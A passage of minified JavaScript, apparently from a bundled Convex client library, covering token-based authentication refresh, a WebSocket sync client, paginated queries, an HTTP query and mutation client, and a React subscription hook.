e?w2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Ne=(e,t,n)=>v2(e,typeof t!="symbol"?t+"":t,n);const b2=20*24*60*60*1e3,Bm=2;class x2{constructor(t,n,s){Ne(this,"authState",{state:"noAuth"}),Ne(this,"configVersion",0),Ne(this,"syncState"),Ne(this,"authenticate"),Ne(this,"stopSocket"),Ne(this,"tryRestartSocket"),Ne(this,"pauseSocket"),Ne(this,"resumeSocket"),Ne(this,"clearAuth"),Ne(this,"logger"),Ne(this,"refreshTokenLeewaySeconds"),Ne(this,"initialAuthTokenReuse"),Ne(this,"lastRefreshChange"),Ne(this,"tokenConfirmationAttempts",0),this.syncState=t,this.authenticate=n.authenticate,this.stopSocket=n.stopSocket,this.tryRestartSocket=n.tryRestartSocket,this.pauseSocket=n.pauseSocket,this.resumeSocket=n.resumeSocket,this.clearAuth=n.clearAuth,this.logger=s.logger,this.refreshTokenLeewaySeconds=s.refreshTokenLeewaySeconds,this.initialAuthTokenReuse=s.initialAuthTokenReuse,this.lastRefreshChange=!1}notifyRefreshChange(t){this.authState.state!=="noAuth"&&this.authState.state!=="initialRefetch"&&this.authState.config.onRefreshChange&&this.lastRefreshChange!==t&&(this.lastRefreshChange=t,this.authState.config.onRefreshChange(t))}async setConfig(t,n,s){this.resetAuthState(),this._logVerbose("pausing WS for auth token fetch"),this.pauseSocket();const r=await this.fetchTokenAndGuardAgainstRace(t,{forceRefreshToken:!1});if(r.isFromOutdatedConfig)return;const i={fetchToken:t,onAuthChange:n,onRefreshChange:s};r.value?(this.setAuthState({state:"waitingForServerConfirmationOfCachedToken",config:i,hasRetried:!1}),this.authenticate(r.value)):(this.setAuthState({state:"initialRefetch",config:i}),await this.refetchToken()),this._logVerbose("resuming WS after auth token fetch"),this.resumeSocket()}onTransition(t){var n;if(this.syncState.isCurrentOrNewerAuthVersion(t.endVersion.identity)&&!(t.endVersion.identity<=t.startVersion.identity)){if(this._logVerbose(`auth state is ${this.authState.state} when handling transition`),this.syncState.markAuthCompletion(),this.authState.state==="waitingForServerConfirmationOfCachedToken"){this._logVerbose("server confirmed auth token is valid");const s=(n=this.syncState.getAuth())==null?void 0:n.value;this.initialAuthTokenReuse&&s?this.scheduleTokenRefetch(s,t.clientClockSkew):this.refetchToken(),this.authState.config.onAuthChange(!0);return}this.authState.state==="waitingForServerConfirmationOfFreshToken"&&(this._logVerbose("server confirmed new auth token is valid"),this.notifyRefreshChange(!1),this.scheduleTokenRefetch(this.authState.token),this.tokenConfirmationAttempts=0,this.authState.hadAuth||this.authState.config.onAuthChange(!0))}}onAuthError(t){if(t.authUpdateAttempted===!1&&(this.authState.state==="waitingForServerConfirmationOfFreshToken"||this.authState.state==="waitingForServerConfirmationOfCachedToken")){this._logVerbose("ignoring non-auth token expired error");return}const{baseVersion:n}=t;if(!this.syncState.isCurrentOrNewerAuthVersion(n+1)){this._logVerbose("ignoring auth error for previous auth attempt");return}this.tryToReauthenticate(t)}async tryToReauthenticate(t){if(this._logVerbose(`attempting to reauthenticate: ${t.error}`),this.authState.state==="noAuth"||this.authState.state==="waitingForServerConfirmationOfFreshToken"&&this.tokenConfirmationAttempts>=Bm){this.logger.error(`Failed to authenticate: "${t.error}", check your server auth config`),this.syncState.hasAuth()&&this.syncState.clearAuth(),this.authState.state!=="noAuth"&&this.setAndReportAuthFailed(this.authState.config.onAuthChange);return}if(this.authState.state==="waitingForServerConfirmationOfFreshToken"&&(this.tokenConfirmationAttempts++,this._logVerbose(`retrying reauthentication, ${Bm-this.tokenConfirmationAttempts} attempts remaining`)),this.notifyRefreshChange(!0),await this.stopSocket(),this.authState.state==="noAuth")return;const n=await this.fetchTokenAndGuardAgainstRace(this.authState.config.fetchToken,{forceRefreshToken:!0});n.isFromOutdatedConfig||(n.value&&this.syncState.isNewAuth(n.value)?(this.authenticate(n.value),this.setAuthState({state:"waitingForServerConfirmationOfFreshToken",config:this.authState.config,token:n.value,hadAuth:this.authState.state==="notRefetching"||this.authState.state==="waitingForScheduledRefetch"})):(this._logVerbose("reauthentication failed, could not fetch a new token"),this.syncState.hasAuth()&&this.syncState.clearAuth(),this.setAndReportAuthFailed(this.authState.config.onAuthChange)),this.tryRestartSocket())}async refetchToken(){if(this.authState.state==="noAuth")return;this._logVerbose("refetching auth token");const t=await this.fetchTokenAndGuardAgainstRace(this.authState.config.fetchToken,{forceRefreshToken:!0});t.isFromOutdatedConfig||(t.value?this.syncState.isNewAuth(t.value)?(this.setAuthState({state:"waitingForServerConfirmationOfFreshToken",hadAuth:this.syncState.hasAuth(),token:t.value,config:this.authState.config}),this.authenticate(t.value)):this.setAuthState({state:"notRefetching",config:this.authState.config}):(this._logVerbose("refetching token failed"),this.syncState.hasAuth()&&this.clearAuth(),this.setAndReportAuthFailed(this.authState.config.onAuthChange)),this._logVerbose("restarting WS after auth token fetch (if currently stopped)"),this.tryRestartSocket())}scheduleTokenRefetch(t,n){if(this.authState.state==="noAuth")return;const s=this.decodeToken(t);if(!s){this.logger.error("Auth token is not a valid JWT, cannot refetch the token");return}const{iat:r,exp:i}=s;if(!r||!i){this.logger.error("Auth token does not have required fields, cannot refetch the token");return}const o=i-r;if(o<=2){this.logger.error("Auth token does not live long enough, cannot refetch the token");return}let a;if(n!==void 0){const u=(Date.now()-n)/1e3;a=i-u,a<=0&&(a=0)}else a=o;let l=Math.min(b2,(a-this.refreshTokenLeewaySeconds)*1e3);l<=0&&(this.logger.warn(`Refetching auth token immediately, configured leeway ${this.refreshTokenLeewaySeconds}s is larger than the token's lifetime ${a}s`),l=0);const c=setTimeout(()=>{this._logVerbose("running scheduled token refetch"),this.refetchToken()},l);this.setAuthState({state:"waitingForScheduledRefetch",refetchTokenTimeoutId:c,config:this.authState.config}),this._logVerbose(`scheduled preemptive auth token refetching in ${l}ms`)}async fetchTokenAndGuardAgainstRace(t,n){const s=++this.configVersion;this._logVerbose(`fetching token with config version ${s}`);const r=await t(n);return this.configVersion!==s?(this._logVerbose(`stale config version, expected ${s}, got ${this.configVersion}`),{isFromOutdatedConfig:!0}):{isFromOutdatedConfig:!1,value:r}}stop(){this.resetAuthState(),this.configVersion++,this._logVerbose(`config version bumped to ${this.configVersion}`)}setAndReportAuthFailed(t){t(!1),this.resetAuthState()}resetAuthState(){this.notifyRefreshChange(!1),this.setAuthState({state:"noAuth"})}setAuthState(t){const n=t.state==="waitingForServerConfirmationOfFreshToken"?{hadAuth:t.hadAuth,state:t.state,token:`...${t.token.slice(-7)}`}:{state:t.state};switch(this._logVerbose(`setting auth state to ${JSON.stringify(n)}`),t.state){case"waitingForScheduledRefetch":case"notRefetching":case"noAuth":this.tokenConfirmationAttempts=0;break}this.authState.state==="waitingForScheduledRefetch"&&clearTimeout(this.authState.refetchTokenTimeoutId),this.authState=t}decodeToken(t){try{return qb(t)}catch(n){return this._logVerbose(`Error decoding token: ${n instanceof Error?n.message:"Unknown error"}`),null}}_logVerbose(t){this.logger.logVerbose(`${t} [v${this.configVersion}]`)}}const k2=["convexClientConstructed","convexWebSocketOpen","convexFirstMessageReceived"];function S2(e,t){const n={sessionId:t};typeof performance>"u"||!performance.mark||performance.mark(e,{detail:n})}function T2(e){let t=e.name.slice(6);return t=t.charAt(0).toLowerCase()+t.slice(1),{name:t,startTime:e.startTime}}function C2(e){if(typeof performance>"u"||!performance.getEntriesByName)return[];const t=[];for(const n of k2){const s=performance.getEntriesByName(n).filter(r=>r.entryType==="mark").filter(r=>r.detail.sessionId===e);t.push(...s)}return t.map(T2)}var A2=Object.defineProperty,E2=(e,t,n)=>t in e?A2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,le=(e,t,n)=>E2(e,typeof t!="symbol"?t+"":t,n);class R2{constructor(t,n,s){if(le(this,"address"),le(this,"state"),le(this,"requestManager"),le(this,"webSocketManager"),le(this,"authenticationManager"),le(this,"remoteQuerySet"),le(this,"optimisticQueryResults"),le(this,"_transitionHandlerCounter",0),le(this,"_nextRequestId"),le(this,"_onTransitionFns",new Map),le(this,"_sessionId"),le(this,"firstMessageReceived",!1),le(this,"debug"),le(this,"logger"),le(this,"maxObservedTimestamp"),le(this,"connectionStateSubscribers",new Map),le(this,"nextConnectionStateSubscriberId",0),le(this,"_lastPublishedConnectionState"),le(this,"markConnectionStateDirty",()=>{Promise.resolve().then(()=>{const m=this.connectionState();if(JSON.stringify(m)!==JSON.stringify(this._lastPublishedConnectionState)){this._lastPublishedConnectionState=m;for(const f of this.connectionStateSubscribers.values())f(m)}})}),le(this,"mark",m=>{this.debug&&S2(m,this.sessionId)}),typeof t=="object")throw new Error("Passing a ClientConfig object is no longer supported. Pass the URL of the Convex deployment as a string directly.");(s==null?void 0:s.skipConvexDeploymentUrlCheck)!==!0&&yb(t),s={...s};const r=s.authRefreshTokenLeewaySeconds??10;let i=s.webSocketConstructor;if(!i&&typeof WebSocket>"u")throw new Error("No WebSocket global variable defined! To use Convex in an environment without WebSocket try the HTTP client: https://docs.convex.dev/api/classes/browser.ConvexHttpClient");i=i||WebSocket,this.debug=s.reportDebugInfoToConvex??!1,this.address=t,this.logger=s.logger===!1?kh({verbose:s.verbose??!1}):s.logger!==!0&&s.logger?s.logger:xh({verbose:s.verbose??!1});const o=t.search("://");if(o===-1)throw new Error("Provided address was not an absolute URL.");const a=t.substring(o+3),l=t.substring(0,o);let c;if(l==="http")c="ws";else if(l==="https")c="wss";else throw new Error(`Unknown parent protocol ${l}`);const u=`${c}://${a}/api/${Fn}/sync`;this.state=new VR,this.remoteQuerySet=new Dm(m=>this.state.queryPath(m),this.logger),this.requestManager=new zR(this.logger,this.markConnectionStateDirty);const d=()=>{this.webSocketManager.pause(),this.state.pause()};this.authenticationManager=new x2(this.state,{authenticate:m=>{const f=this.state.setAuth(m);return this.webSocketManager.sendMessage(f),f.baseVersion},stopSocket:()=>this.webSocketManager.stop(),tryRestartSocket:()=>this.webSocketManager.tryRestart(),pauseSocket:d,resumeSocket:()=>this.webSocketManager.resume(),clearAuth:()=>{this.clearAuth()}},{logger:this.logger,refreshTokenLeewaySeconds:r,initialAuthTokenReuse:s.initialAuthTokenReuse??!1}),this.optimisticQueryResults=new XR,this.addOnTransitionHandler(m=>{n(m.queries.map(f=>f.token))}),this._nextRequestId=0,this._sessionId=f2();const{unsavedChangesWarning:h}=s;if(typeof window>"u"||typeof window.addEventListener>"u"){if(h===!0)throw new Error("unsavedChangesWarning requested, but window.addEventListener not found! Remove {unsavedChangesWarning: true} from Convex client options.")}else h!==!1&&window.addEventListener("beforeunload",m=>{if(this.requestManager.hasIncompleteRequests()){m.preventDefault();const f="Are you sure you want to leave? Your changes may not be saved.";return(m||window.event).returnValue=f,f}});this.webSocketManager=new p2(u,{onOpen:m=>{this.mark("convexWebSocketOpen"),this.webSocketManager.sendMessage({...m,type:"Connect",sessionId:this._sessionId,maxObservedTimestamp:this.maxObservedTimestamp}),this.remoteQuerySet=new Dm(x=>this.state.queryPath(x),this.logger);const[f,v]=this.state.restart();v&&this.webSocketManager.sendMessage(v),this.webSocketManager.sendMessage(f);for(const x of this.requestManager.restart())this.webSocketManager.sendMessage(x)},onResume:()=>{const[m,f]=this.state.resume();f&&this.webSocketManager.sendMessage(f),m&&this.webSocketManager.sendMessage(m);for(const v of this.requestManager.resume())this.webSocketManager.sendMessage(v)},onMessage:m=>{switch(this.firstMessageReceived||(this.firstMessageReceived=!0,this.mark("convexFirstMessageReceived"),this.reportMarks()),m.type){case"Transition":{this.observedTimestamp(m.endVersion.ts),this.authenticationManager.onTransition(m),this.remoteQuerySet.transition(m),this.state.transition(m);const f=this.requestManager.removeCompleted(this.remoteQuerySet.timestamp());this.notifyOnQueryResultChanges(f);break}case"MutationResponse":{m.success&&this.observedTimestamp(m.ts);const f=this.requestManager.onResponse(m);f!==null&&this.notifyOnQueryResultChanges(new Map([[f.requestId,f.result]]));break}case"ActionResponse":{this.requestManager.onResponse(m);break}case"AuthError":{this.authenticationManager.onAuthError(m);break}case"FatalError":{const f=_R(this.logger,m.error);throw this.webSocketManager.terminate(),f}}return{hasSyncedPastLastReconnect:this.hasSyncedPastLastReconnect()}},onServerDisconnectError:s.onServerDisconnectError},i,this.logger,this.markConnectionStateDirty,this.debug),this.mark("convexClientConstructed"),s.expectAuth&&d()}hasSyncedPastLastReconnect(){return this.requestManager.hasSyncedPastLastReconnect()&&this.state.hasSyncedPastLastReconnect()}observedTimestamp(t){(this.maxObservedTimestamp===void 0||this.maxObservedTimestamp.lessThanOrEqual(t))&&(this.maxObservedTimestamp=t)}getMaxObservedTimestamp(){return this.maxObservedTimestamp}notifyOnQueryResultChanges(t){const n=this.remoteQuerySet.remoteQueryResults(),s=new Map;for(const[i,o]of n){const a=this.state.queryToken(i);if(a!==null){const l={result:o,udfPath:this.state.queryPath(i),args:this.state.queryArgs(i)};s.set(a,l)}}const r=this.optimisticQueryResults.ingestQueryResultsFromServer(s,new Set(t.keys()));this.handleTransition({queries:r.map(i=>{const o=this.optimisticQueryResults.rawQueryResult(i);return{token:i,modification:{kind:"Updated",result:o}}}),reflectedMutations:Array.from(t).map(([i,o])=>({requestId:i,result:o})),timestamp:this.remoteQuerySet.timestamp()})}handleTransition(t){for(const n of this._onTransitionFns.values())n(t)}addOnTransitionHandler(t){const n=this._transitionHandlerCounter++;return this._onTransitionFns.set(n,t),()=>this._onTransitionFns.delete(n)}getCurrentAuthClaims(){const t=this.state.getAuth();let n={};if(t&&t.tokenType==="User")try{n=t?qb(t.value):{}}catch{n={}}else return;return{token:t.value,decoded:n}}setAuth(t,n,s){this.authenticationManager.setConfig(t,n,s)}hasAuth(){return this.state.hasAuth()}setAdminAuth(t,n){const s=this.state.setAdminAuth(t,n);this.webSocketManager.sendMessage(s)}clearAuth(){const t=this.state.clearAuth();this.webSocketManager.sendMessage(t)}subscribe(t,n,s){const r=Le(n),{modification:i,queryToken:o,unsubscribe:a}=this.state.subscribe(t,r,s==null?void 0:s.journal,s==null?void 0:s.componentPath);return i!==null&&this.webSocketManager.sendMessage(i),{queryToken:o,unsubscribe:()=>{const l=a();l&&this.webSocketManager.sendMessage(l)}}}localQueryResult(t,n){const s=Le(n),r=Jn(t,s);return this.optimisticQueryResults.queryResult(r)}localQueryResultByToken(t){return this.optimisticQueryResults.queryResult(t)}hasLocalQueryResultByToken(t){return this.optimisticQueryResults.hasQueryResult(t)}localQueryLogs(t,n){const s=Le(n),r=Jn(t,s);return this.optimisticQueryResults.queryLogs(r)}queryJournal(t,n){const s=Le(n),r=Jn(t,s);return this.state.queryJournal(r)}connectionState(){const t=this.webSocketManager.connectionState();return{hasInflightRequests:this.requestManager.hasInflightRequests(),isWebSocketConnected:t.isConnected,hasEverConnected:t.hasEverConnected,connectionCount:t.connectionCount,connectionRetries:t.connectionRetries,timeOfOldestInflightRequest:this.requestManager.timeOfOldestInflightRequest(),inflightMutations:this.requestManager.inflightMutations(),inflightActions:this.requestManager.inflightActions()}}subscribeToConnectionState(t){const n=this.nextConnectionStateSubscriberId++;return this.connectionStateSubscribers.set(n,t),()=>{this.connectionStateSubscribers.delete(n)}}async mutation(t,n,s){const r=await this.mutationInternal(t,n,s);if(!r.success)throw r.errorData!==void 0?Mu(r,new $n(Os("mutation",t,r))):new Error(Os("mutation",t,r));return r.value}async mutationInternal(t,n,s,r){const{mutationPromise:i}=this.enqueueMutation(t,n,s,r);return i}enqueueMutation(t,n,s,r){const i=Le(n);this.tryReportLongDisconnect();const o=this.nextRequestId;if(this._nextRequestId++,s!==void 0){const u=s.optimisticUpdate;if(u!==void 0){const d=f=>{u(f,i)instanceof Promise&&this.logger.warn("Optimistic update handler returned a Promise. Optimistic updates should be synchronous.")},m=this.optimisticQueryResults.applyOptimisticUpdate(d,o).map(f=>{const v=this.localQueryResultByToken(f);return{token:f,modification:{kind:"Updated",result:v===void 0?void 0:{success:!0,value:v,logLines:[]}}}});this.handleTransition({queries:m,reflectedMutations:[],timestamp:this.remoteQuerySet.timestamp()})}}const a={type:"Mutation",requestId:o,udfPath:t,componentPath:r,args:[_e(i)]},l=this.webSocketManager.sendMessage(a),c=this.requestManager.request(a,l);return{requestId:o,mutationPromise:c}}async action(t,n){const s=await this.actionInternal(t,n);if(!s.success)throw s.errorData!==void 0?Mu(s,new $n(Os("action",t,s))):new Error(Os("action",t,s));return s.value}async actionInternal(t,n,s){const r=Le(n),i=this.nextRequestId;this._nextRequestId++,this.tryReportLongDisconnect();const o={type:"Action",requestId:i,udfPath:t,componentPath:s,args:[_e(r)]},a=this.webSocketManager.sendMessage(o);return this.requestManager.request(o,a)}async close(){return this.authenticationManager.stop(),this.webSocketManager.terminate()}get url(){return this.address}get nextRequestId(){return this._nextRequestId}get sessionId(){return this._sessionId}reportMarks(){if(this.debug){const t=C2(this.sessionId);this.webSocketManager.sendMessage({type:"Event",eventType:"ClientConnect",event:t})}}tryReportLongDisconnect(){if(!this.debug)return;const t=this.connectionState().timeOfOldestInflightRequest;if(t===null||Date.now()-t.getTime()<=60*1e3)return;const n=`${this.address}/api/debug_event`;fetch(n,{method:"POST",headers:{"Content-Type":"application/json","Convex-Client":`npm-${Fn}`},body:JSON.stringify({event:"LongWebsocketDisconnect"})}).then(s=>{s.ok||this.logger.warn("Analytics request failed with response:",s.body)}).catch(s=>{this.logger.warn("Analytics response failed with error:",s)})}}function Zl(e){if(typeof e!="object"||e===null||!Array.isArray(e.page)||typeof e.isDone!="boolean"||typeof e.continueCursor!="string")throw new Error(`Not a valid paginated query result: ${e==null?void 0:e.toString()}`);return e}var P2=Object.defineProperty,q2=(e,t,n)=>t in e?P2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Vm=(e,t,n)=>q2(e,typeof t!="symbol"?t+"":t,n);class O2{constructor(t,n){this.client=t,this.onTransition=n,Vm(this,"paginatedQuerySet",new Map),Vm(this,"lastTransitionTs"),this.lastTransitionTs=je.fromNumber(0),this.client.addOnTransitionHandler(s=>this.onBaseTransition(s))}subscribe(t,n,s){const r=rs(t),i=jm(r,n,s),o=()=>this.removePaginatedQuerySubscriber(i),a=this.paginatedQuerySet.get(i);return a?(a.numSubscribers+=1,{paginatedQueryToken:i,unsubscribe:o}):(this.paginatedQuerySet.set(i,{token:i,canonicalizedUdfPath:r,args:n,numSubscribers:1,options:{initialNumItems:s.initialNumItems},nextPageKey:0,pageKeys:[],pageKeyToQuery:new Map,ongoingSplits:new Map,skip:!1,id:s.id}),this.addPageToPaginatedQuery(i,null,s.initialNumItems),{paginatedQueryToken:i,unsubscribe:o})}localQueryResult(t,n,s){const r=rs(t),i=jm(r,n,s);return this.localQueryResultByToken(i)}localQueryResultByToken(t){const n=this.paginatedQuerySet.get(t);if(!n)return;const s=this.activePageQueryTokens(n);if(s.length===0)return{results:[],status:"LoadingFirstPage",loadMore:l=>this.loadMoreOfPaginatedQuery(t,l)};let r=[],i=!1,o=!1;for(const l of s){const c=this.client.localQueryResultByToken(l);if(c===void 0){i=!0,o=!1;continue}const u=Zl(c);r=r.concat(u.page),o=!!u.isDone}let a;return i?a=r.length===0?"LoadingFirstPage":"LoadingMore":o?a="Exhausted":a="CanLoadMore",{results:r,status:a,loadMore:l=>this.loadMoreOfPaginatedQuery(t,l)}}onBaseTransition(t){const n=t.queries.map(o=>o.token),s=this.queriesContainingTokens(n);let r=[];s.length>0&&(this.processPaginatedQuerySplits(s,o=>this.client.localQueryResultByToken(o)),r=s.map(o=>({token:o,modification:{kind:"Updated",result:this.localQueryResultByToken(o)}})));const i={...t,paginatedQueries:r};this.onTransition(i)}loadMoreOfPaginatedQuery(t,n){this.mustGetPaginatedQuery(t);const s=this.queryTokenForLastPageOfPaginatedQuery(t),r=this.client.localQueryResultByToken(s);if(!r)return!1;const i=Zl(r);if(i.isDone)return!1;this.addPageToPaginatedQuery(t,i.continueCursor,n);const o={timestamp:this.lastTransitionTs,reflectedMutations:[],queries:[],paginatedQueries:[{token:t,modification:{kind:"Updated",result:this.localQueryResultByToken(t)}}]};return this.onTransition(o),!0}queriesContainingTokens(t){if(t.length===0)return[];const n=[],s=new Set(t);for(const[r,i]of this.paginatedQuerySet)for(const o of this.allQueryTokens(i))if(s.has(o)){n.push(r);break}return n}processPaginatedQuerySplits(t,n){for(const s of t){const r=this.mustGetPaginatedQuery(s),{ongoingSplits:i,pageKeyToQuery:o,pageKeys:a}=r;for(const[l,[c,u]]of i)n(o.get(c).queryToken)!==void 0&&n(o.get(u).queryToken)!==void 0&&this.completePaginatedQuerySplit(r,l,c,u);for(const l of a){if(i.has(l))continue;const c=o.get(l);if(!c)throw new Error(`No page query for active pageKey ${l}`);const u=n(c.queryToken);if(!u)continue;const d=Zl(u);d.splitCursor&&(d.pageStatus==="SplitRecommended"||d.pageStatus==="SplitRequired"||d.page.length>r.options.initialNumItems*2)&&this.splitPaginatedQueryPage(r,l,c.cursor,d.splitCursor,d.continueCursor)}}}splitPaginatedQueryPage(t,n,s,r,i){const o=t.nextPageKey++,a=t.nextPageKey++,l={numItems:t.options.initialNumItems,id:t.id},c=this.client.subscribe(t.canonicalizedUdfPath,{...t.args,paginationOpts:{...l,cursor:s,endCursor:r}});t.pageKeyToQuery.set(o,{...c,cursor:s});const u=this.client.subscribe(t.canonicalizedUdfPath,{...t.args,paginationOpts:{...l,cursor:r,endCursor:i}});t.pageKeyToQuery.set(a,{...u,cursor:r}),t.ongoingSplits.set(n,[o,a])}addPageToPaginatedQuery(t,n,s){const r=this.mustGetPaginatedQuery(t),i=r.nextPageKey++,o={cursor:n,numItems:s,id:r.id},a={...r.args,paginationOpts:o},l=this.client.subscribe(r.canonicalizedUdfPath,a);return r.pageKeys.push(i),r.pageKeyToQuery.set(i,{...l,cursor:n}),l}removePaginatedQuerySubscriber(t){const n=this.paginatedQuerySet.get(t);if(n&&(n.numSubscribers-=1,!(n.numSubscribers>0))){for(const s of n.pageKeyToQuery.values())s.unsubscribe();this.paginatedQuerySet.delete(t)}}completePaginatedQuerySplit(t,n,s,r){const i=t.pageKeyToQuery.get(n);t.pageKeyToQuery.delete(n);const o=t.pageKeys.indexOf(n);t.pageKeys.splice(o,1,s,r),t.ongoingSplits.delete(n),i.unsubscribe()}activePageQueryTokens(t){return t.pageKeys.map(n=>t.pageKeyToQuery.get(n).queryToken)}allQueryTokens(t){return Array.from(t.pageKeyToQuery.values()).map(n=>n.queryToken)}queryTokenForLastPageOfPaginatedQuery(t){const n=this.mustGetPaginatedQuery(t),s=n.pageKeys[n.pageKeys.length-1];if(s===void 0)throw new Error(`No pages for paginated query ${t}`);return n.pageKeyToQuery.get(s).queryToken}mustGetPaginatedQuery(t){const n=this.paginatedQuerySet.get(t);if(!n)throw new Error("paginated query no longer exists for token "+t);return n}}var I2=Object.defineProperty,N2=(e,t,n)=>t in e?I2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Ct=(e,t,n)=>N2(e,typeof t!="symbol"?t+"":t,n);const uo=560;let wr;class j2{constructor(t,n){if(Ct(this,"address"),Ct(this,"auth"),Ct(this,"adminAuth"),Ct(this,"encodedTsPromise"),Ct(this,"debug"),Ct(this,"fetchOptions"),Ct(this,"fetch"),Ct(this,"logger"),Ct(this,"mutationQueue",[]),Ct(this,"isProcessingQueue",!1),typeof n=="boolean")throw new Error("skipConvexDeploymentUrlCheck as the second argument is no longer supported. Please pass an options object, `{ skipConvexDeploymentUrlCheck: true }`.");(n??{}).skipConvexDeploymentUrlCheck!==!0&&yb(t),this.logger=(n==null?void 0:n.logger)===!1?kh({verbose:!1}):(n==null?void 0:n.logger)!==!0&&(n!=null&&n.logger)?n.logger:xh({verbose:!1}),this.address=t,this.debug=!0,this.auth=void 0,this.adminAuth=void 0,this.fetch=n==null?void 0:n.fetch,n!=null&&n.auth&&this.setAuth(n.auth)}backendUrl(){return`${this.address}/api`}get url(){return this.address}setAuth(t){this.clearAuth(),this.auth=t}setAdminAuth(t,n){if(this.clearAuth(),n!==void 0){const s=new TextEncoder().encode(JSON.stringify(n)),r=btoa(String.fromCodePoint(...s));this.adminAuth=`${t}:${r}`}else this.adminAuth=t}clearAuth(){this.auth=void 0,this.adminAuth=void 0}setDebug(t){this.debug=t}setFetchOptions(t){this.fetchOptions=t}async consistentQuery(t,...n){const s=Le(n[0]),r=this.getTimestamp();return await this.queryInner(t,s,{timestampPromise:r})}async getTimestamp(){return this.encodedTsPromise?this.encodedTsPromise:this.encodedTsPromise=this.getTimestampInner()}async getTimestampInner(){const t=this.fetch||wr||fetch,n={"Content-Type":"application/json","Convex-Client":`npm-${Fn}`},s=await t(`${this.address}/api/query_ts`,{...this.fetchOptions,method:"POST",headers:n});if(!s.ok)throw new Error(await s.text());const{ts:r}=await s.json();return r}async query(t,...n){const s=Le(n[0]);return await this.queryInner(t,s,{})}async queryInner(t,n,s){const r=ye(t),i=[_e(n)],o={"Content-Type":"application/json","Convex-Client":`npm-${Fn}`};this.adminAuth?o.Authorization=`Convex ${this.adminAuth}`:this.auth&&(o.Authorization=`Bearer ${this.auth}`);const a=this.fetch||wr||fetch,l=s.timestampPromise?await s.timestampPromise:void 0,c=JSON.stringify({path:r,format:"convex_encoded_json",args:i,...l?{ts:l}:{}}),u=l?`${this.address}/api/query_at_ts`:`${this.address}/api/query`,d=await a(u,{...this.fetchOptions,body:c,method:"POST",headers:o});if(!d.ok&&d.status!==uo)throw new Error(await d.text());const h=await d.json();if(this.debug)for(const m of h.logLines??[])hn(this.logger,"info","query",r,m);switch(h.status){case"success":return wt(h.value);case"error":throw h.errorData!==void 0?ho(h.errorData,new $n(h.errorMessage)):new Error(h.errorMessage);default:throw new Error(`Invalid response: ${JSON.stringify(h)}`)}}async mutationInner(t,n){const s=ye(t),r=JSON.stringify({path:s,format:"convex_encoded_json",args:[_e(n)]}),i={"Content-Type":"application/json","Convex-Client":`npm-${Fn}`};this.adminAuth?i.Authorization=`Convex ${this.adminAuth}`:this.auth&&(i.Authorization=`Bearer ${this.auth}`);const a=await(this.fetch||wr||fetch)(`${this.address}/api/mutation`,{...this.fetchOptions,body:r,method:"POST",headers:i});if(!a.ok&&a.status!==uo)throw new Error(await a.text());const l=await a.json();if(this.debug)for(const c of l.logLines??[])hn(this.logger,"info","mutation",s,c);switch(l.status){case"success":return wt(l.value);case"error":throw l.errorData!==void 0?ho(l.errorData,new $n(l.errorMessage)):new Error(l.errorMessage);default:throw new Error(`Invalid response: ${JSON.stringify(l)}`)}}async processMutationQueue(){if(!this.isProcessingQueue){for(this.isProcessingQueue=!0;this.mutationQueue.length>0;){const{mutation:t,args:n,resolve:s,reject:r}=this.mutationQueue.shift();try{const i=await this.mutationInner(t,n);s(i)}catch(i){r(i)}}this.isProcessingQueue=!1}}enqueueMutation(t,n){return new Promise((s,r)=>{this.mutationQueue.push({mutation:t,args:n,resolve:s,reject:r}),this.processMutationQueue()})}async mutation(t,...n){const[s,r]=n,i=Le(s);return r!=null&&r.skipQueue?await this.mutationInner(t,i):await this.enqueueMutation(t,i)}async action(t,...n){const s=Le(n[0]),r=ye(t),i=JSON.stringify({path:r,format:"convex_encoded_json",args:[_e(s)]}),o={"Content-Type":"application/json","Convex-Client":`npm-${Fn}`};this.adminAuth?o.Authorization=`Convex ${this.adminAuth}`:this.auth&&(o.Authorization=`Bearer ${this.auth}`);const l=await(this.fetch||wr||fetch)(`${this.address}/api/action`,{...this.fetchOptions,body:i,method:"POST",headers:o});if(!l.ok&&l.status!==uo)throw new Error(await l.text());const c=await l.json();if(this.debug)for(const u of c.logLines??[])hn(this.logger,"info","action",r,u);switch(c.status){case"success":return wt(c.value);case"error":throw c.errorData!==void 0?ho(c.errorData,new $n(c.errorMessage)):new Error(c.errorMessage);default:throw new Error(`Invalid response: ${JSON.stringify(c)}`)}}async function(t,n,...s){const r=Le(s[0]),i=typeof t=="string"?t:ye(t),o=JSON.stringify({componentPath:n,path:i,format:"convex_encoded_json",args:_e(r)}),a={"Content-Type":"application/json","Convex-Client":`npm-${Fn}`};this.adminAuth?a.Authorization=`Convex ${this.adminAuth}`:this.auth&&(a.Authorization=`Bearer ${this.auth}`);const c=await(this.fetch||wr||fetch)(`${this.address}/api/function`,{...this.fetchOptions,body:o,method:"POST",headers:a});if(!c.ok&&c.status!==uo)throw new Error(await c.text());const u=await c.json();if(this.debug)for(const d of u.logLines??[])hn(this.logger,"info","any",i,d);switch(u.status){case"success":return wt(u.value);case"error":throw u.errorData!==void 0?ho(u.errorData,new $n(u.errorMessage)):new Error(u.errorMessage);default:throw new Error(`Invalid response: ${JSON.stringify(u)}`)}}}function ho(e,t){return t.data=wt(e),t}function M2({getCurrentValue:e,subscribe:t}){const[n,s]=w.useState(()=>({getCurrentValue:e,subscribe:t,value:e()}));let r=n.value;return(n.getCurrentValue!==e||n.subscribe!==t)&&(r=e(),s({getCurrentValue:e,subscribe:t,value:r})),w.useEffect(()=>{let i=!1;const o=()=>{i||s(l=>{if(l.getCurrentValue!==e||l.subscribe!==t)return l;const c=e();return l.value===c?l:{...l,value:c}})},a=t(o);return o(),()=>{i=!0,a()}},[e,t]),r}var L2=Object.defineProperty,D2=(e,t,n)=>t in e?L2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,_t=(e,t,n)=>D2(e,typeof t!="symbol"?t+"":t,n);const _2=5e3;if(typeof Ut>"u")throw new Error("Required dependency 'react' not found");function Ob(e,t,n){function s(r){return V2(r),t.mutation(e,r,{optimisticUpdate:n})}return s.withOptimisticUpdate=function(i){if(n!==void 0)throw new Error(`Already specified optimistic update for mutation ${ye(e)}`);return Ob(e,t,i)},s}class 